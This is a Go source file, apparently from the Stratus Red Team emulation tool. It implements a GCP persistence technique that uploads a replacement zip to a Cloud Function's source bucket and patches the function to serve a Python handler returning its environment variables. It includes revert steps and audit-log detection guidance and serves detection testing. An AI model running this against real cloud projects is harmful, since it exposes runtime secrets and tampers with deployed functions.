package gcp

import (
	"archive/zip"
	"bytes"
	"context"
	_ "embed"
	"fmt"
	"log"
	"time"

	"cloud.google.com/go/storage"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	cloudfunctions "google.golang.org/api/cloudfunctions/v2"
)

//go:embed main.tf
var tf []byte

// maliciousSource is the Python source code that replaces the original function.
// It returns the process environment, demonstrating that injected code can access
// runtime secrets such as environment variables and mounted secret volumes.
const maliciousSource = `import subprocess

def hello_world(request):
    # Code injected via source overwrite
    return subprocess.check_output(['env']).decode()
`

// maliciousObjectName is the GCS object name used to store the injected source.
const maliciousObjectName = "stratus-red-team-injected-source.zip"

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.persistence.overwrite-cloud-function",
		FriendlyName: "Overwrite a Cloud Function with Malicious Source Code",
		Description: `
Replaces the source code of an existing Cloud Functions v2 function with code that
exfiltrates runtime environment variables. This simulates supply-chain or insider
attacks where an adversary with write access to the function's source bucket — or
direct Cloud Functions update permissions — modifies the function to harvest secrets
injected via environment variables, mounted Secret Manager secrets, or service account
token metadata available at runtime.

The injected replacement function calls <code>env</code> and returns the output in
the HTTP response body, allowing an attacker to read any runtime secret by triggering
the function endpoint.

Warm-up:

- Create a Cloud Functions v2 function with a benign Python hello-world handler

Detonation:

- Build a replacement source zip in memory containing the malicious handler
- Upload the zip to the function's GCS source bucket
- Update the function's <code>buildConfig.source.storageSource</code> to reference
  the new zip and trigger a redeploy

Revert:

- Update the function's <code>buildConfig.source.storageSource</code> to point back
  to the original source object

References:

- https://cloud.google.com/functions/docs/deploying
- https://cloud.google.com/functions/docs/reference/rest/v2/projects.locations.functions/patch
`,
		Detection: `
Identify unexpected Cloud Function source updates by monitoring for
<code>google.cloud.functions.v2.CloudFunctionsService.UpdateFunction</code> events in
GCP Admin Activity audit logs. Alert on updates where the source object changes,
especially when the new object name does not follow the project's naming conventions.
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               true,
		IsSlow:                     true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

// buildMaliciousZip creates an in-memory zip archive containing a single main.py
// with the malicious function source.
func buildMaliciousZip() ([]byte, error) {
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)

	f, err := w.Create("main.py")
	if err != nil {
		return nil, fmt.Errorf("failed to create main.py in zip: %w", err)
	}
	if _, err = fmt.Fprint(f, maliciousSource); err != nil {
		return nil, fmt.Errorf("failed to write main.py content: %w", err)
	}
	if err = w.Close(); err != nil {
		return nil, fmt.Errorf("failed to finalize zip: %w", err)
	}

	return buf.Bytes(), nil
}

// waitForCFOperation polls a Cloud Functions long-running operation until it
// completes or the maximum number of attempts is reached.
func waitForCFOperation(ctx context.Context, svc *cloudfunctions.Service, opName string) error {
	const maxAttempts = 40
	for attempt := 0; attempt < maxAttempts; attempt++ {
		op, err := svc.Projects.Locations.Operations.Get(opName).Context(ctx).Do()
		if err != nil {
			return fmt.Errorf("failed to poll operation %s: %w", opName, err)
		}
		if op.Done {
			if op.Error != nil {
				return fmt.Errorf("operation %s failed: %s", opName, op.Error.Message)
			}
			return nil
		}
		time.Sleep(5 * time.Second)
	}
	return fmt.Errorf("operation %s did not complete after %d attempts", opName, maxAttempts)
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	functionName := params["function_name"]
	sourceBucket := params["source_bucket"]
	ctx := context.Background()

	// Build the malicious zip in memory.
	zipBytes, err := buildMaliciousZip()
	if err != nil {
		return err
	}

	// Upload the malicious source to the same GCS bucket used by the function.
	storageClient, err := storage.NewClient(ctx, providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to create Storage client: %w", err)
	}
	defer storageClient.Close()

	log.Printf("Uploading malicious source zip to gs://%s/%s\n", sourceBucket, maliciousObjectName)
	writer := storageClient.Bucket(sourceBucket).Object(maliciousObjectName).NewWriter(ctx)
	if _, err = writer.Write(zipBytes); err != nil {
		writer.Close()
		return fmt.Errorf("failed to write malicious source zip: %w", err)
	}
	if err = writer.Close(); err != nil {
		return fmt.Errorf("failed to finalize malicious source zip upload: %w", err)
	}

	// Patch the function to deploy from the injected source.
	cfSvc, err := cloudfunctions.NewService(ctx, providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to create Cloud Functions client: %w", err)
	}

	log.Printf("Updating Cloud Function %s to use injected source\n", functionName)
	op, err := cfSvc.Projects.Locations.Functions.Patch(
		functionName,
		&cloudfunctions.Function{
			BuildConfig: &cloudfunctions.BuildConfig{
				Source: &cloudfunctions.Source{
					StorageSource: &cloudfunctions.StorageSource{
						Bucket: sourceBucket,
						Object: maliciousObjectName,
					},
				},
			},
		},
	).UpdateMask("buildConfig.source.storageSource").Context(ctx).Do()
	if err != nil {
		return fmt.Errorf("failed to patch Cloud Function %s: %w", functionName, err)
	}

	log.Printf("Waiting for function update operation to complete\n")
	if err = waitForCFOperation(ctx, cfSvc, op.Name); err != nil {
		return fmt.Errorf("function update did not complete: %w", err)
	}

	log.Printf("Cloud Function %s has been redeployed with injected source\n", functionName)
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	functionName := params["function_name"]
	sourceBucket := params["source_bucket"]
	originalSourceObject := params["original_source_object"]
	ctx := context.Background()

	cfSvc, err := cloudfunctions.NewService(ctx, providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to create Cloud Functions client: %w", err)
	}

	log.Printf("Restoring Cloud Function %s to original source %s\n", functionName, originalSourceObject)
	op, err := cfSvc.Projects.Locations.Functions.Patch(
		functionName,
		&cloudfunctions.Function{
			BuildConfig: &cloudfunctions.BuildConfig{
				Source: &cloudfunctions.Source{
					StorageSource: &cloudfunctions.StorageSource{
						Bucket: sourceBucket,
						Object: originalSourceObject,
					},
				},
			},
		},
	).UpdateMask("buildConfig.source.storageSource").Context(ctx).Do()
	if err != nil {
		return fmt.Errorf("failed to restore Cloud Function %s: %w", functionName, err)
	}

	log.Printf("Waiting for restore operation to complete\n")
	if err = waitForCFOperation(ctx, cfSvc, op.Name); err != nil {
		return fmt.Errorf("function restore did not complete: %w", err)
	}

	// Remove the injected source object.
	storageClient, err := storage.NewClient(ctx, providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to create Storage client: %w", err)
	}
	defer storageClient.Close()

	log.Printf("Removing injected source zip gs://%s/%s\n", sourceBucket, maliciousObjectName)
	if err = storageClient.Bucket(sourceBucket).Object(maliciousObjectName).Delete(ctx); err != nil {
		log.Printf("Warning: failed to delete injected source zip (may already be gone): %v\n", err)
	}

	log.Printf("Cloud Function %s successfully restored to original source\n", functionName)
	return nil
}
